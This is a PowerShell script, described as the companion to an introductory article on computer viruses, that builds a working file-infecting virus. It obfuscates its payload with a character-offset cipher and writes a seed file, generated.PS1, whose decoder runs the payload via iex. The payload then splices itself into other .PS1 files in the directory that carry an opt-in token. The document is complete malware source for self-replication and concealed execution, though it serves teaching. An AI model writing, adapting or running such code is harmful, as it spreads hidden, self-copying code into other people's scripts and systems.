# Initial infection vector script
# This is an example script file, this source code in a companion to an 
# acticle that serves as an introduction to computer viruses. 

function PSV_code($StrToCode){
	$codedtext = ''

	foreach ($char in [char[]]$StrToCode){

		$intchar =[int]$char 
		$intchar = 300 - $intchar
		$codedtext += $intchar

	}

	$codedtext
}

$VirusCodeSegmentString = "{echo 'PS_Vir_Ex1: Executing code segment.'; 


function InfectFile(`$Source, `$Target, `$LinesFromHead, `$LinesFromTail){
	`$TargetNewName = (`$Target+'.old');
	Rename-Item -Path `$Target -NewName `$TargetNewName; 
	`$Content = 	Get-Content `$Source -Head `$LinesFromHead;
	`$Content | Out-File `$Target;
	type `$TargetNewName | Out-File `$Target -append;

	`$Content = 	Get-Content `$Source -Tail `$LinesFromTail;
	`$Content | Out-File `$Target -append;

}

`$InfectedToken = 'echo `"PS_Vir_Ex1: Redirecting entry point.`";`$CurrentFilePath =  `$MyInvocation.MyCommand.Name; `$VirusCodeBody = Get-Content $CurrentFilePath -Tail 3';

`$AcceptInfectionToken = '#PS_Vir_Ex1_Accept_Infection';

#echo `$InfectedToken;

#echo `$AcceptInfectionToken;

echo 'PS_Vir_Ex1: Looking for files to infect.';


`$Filelist = dir *.PS1 -name;
foreach(`$Filename in `$Filelist){
	`$ScriptStatusToken = Get-Content `$Filename -Head 1;
	if(`$ScriptStatusToken -eq `$InfectedToken){ `$Msg = 'PS_Vir_Ex1: '+`$Filename+' file already infected'; echo `$Msg; }
	elseif(`$ScriptStatusToken -eq `$AcceptInfectionToken){`$Msg = 'PS_Vir_Ex1: '+`$Filename+' file ready for infection!'; echo `$Msg; InfectFile `$CurrentFilePath `$Filename 3 4; `$Msg = 'PS_Vir_Ex1: '+`$Filename+' file has been infected'; echo `$Msg; break;}	
}




echo 'PS_Vir_Ex1: Code segment executed!';}"

$ObscuredVCS = PSV_code $VirusCodeSegmentString
echo $ObscuredVCS


$VirusDecoderSegmentString = '{echo "PS_Vir_Ex1: Decoding code segment.";$codedtext = Get-Content $CurrentFilePath -Tail 1; for($i=1;$i -lt $codedtext.length+1; $i+=3){ $letter = ([char[]]$codedtext)[$i]; $letter += ([char[]]$codedtext)[$i+1]; $letter += ([char[]]$codedtext)[$i+2]; $letter = [char](300 - [int]$letter); $decodedtext += $letter} iex "&$decodedtext"}'

#iex $VirusDecoderSegmentString

$EntryPointCodeSegmentString = 
'echo "PS_Vir_Ex1: Redirecting entry point.";$CurrentFilePath =  $MyInvocation.MyCommand.Name; $VirusCodeBody = Get-Content $CurrentFilePath -Tail 3
$EntryPointRedirect= $VirusCodeBody[0] 
iex "&$EntryPointRedirect"'


$EntryPointCodeSegmentString | Out-File ".\generated.PS1"


"echo 'AFTER EP EXECUTION'" | Out-File ".\generated.PS1" -append

'$VirusDecoderSegment =' | Out-File ".\generated.PS1" -append

$VirusDecoderSegmentString |  Out-File ".\generated.PS1" -append

'$VirusCodeSegment = ""' | Out-File ".\generated.PS1" -append

'#'+$ObscuredVCS |  Out-File ".\generated.PS1" -append


